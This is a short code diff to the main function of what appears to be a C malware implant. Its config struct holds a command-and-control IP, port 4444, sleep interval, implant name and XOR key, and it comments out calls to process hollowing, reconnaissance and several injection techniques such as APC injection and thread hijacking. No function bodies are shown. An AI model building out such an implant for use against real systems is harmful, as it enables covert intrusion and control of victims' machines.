@@ -8,17 +8,14 @@ int main(VOID)
 {
 	//doesn't do anything yet
 	IMPLANT_CONFIG config = { "192.168.1.1", 4444, 60, "BASTILA", 0x42 };
-	printf("CONFIG: %s %d %d %s %X\n", config.c2ip, config.port, config.sleep_interval, config.implant_name, config.xor_key);
+	//printf("CONFIG: %s %d %d %s %X\n", config.c2ip, config.port, config.sleep_interval, config.implant_name, config.xor_key);
 
-
-	hollow_process(config);
-	collect_recon();
-
+	//collect_recon();
 	//inject_self(config);
 	//remote_inject();
 	//apc_inject(config);
 	//early_apc_inject(config);
-
+	//thread_hijack(config);
 
 	return 0;
 
